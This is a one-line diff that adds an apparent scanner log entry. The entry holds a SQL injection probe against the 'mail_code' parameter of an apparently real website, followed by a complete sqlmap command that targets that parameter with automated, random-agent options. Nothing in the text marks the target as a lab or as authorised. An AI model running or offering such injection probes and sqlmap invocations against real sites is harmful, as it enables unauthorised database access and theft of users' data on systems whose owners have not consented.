@@ -1,0 +1,1 @@
+http://www.5iml.com:80/?email=testing%40example.com&ispersis=1&mail_code=testing%40example.com'" (GET)  # "D:\Program Files\Python\Python311\Scripts\sqlmap" -r sqlmap_requests\005_SQL_Injection_mail_code_3883698983373112956.txt --batch --smart --random-agent --output-dir sqlmap_output\005_3883698983373112956 -p mail_code
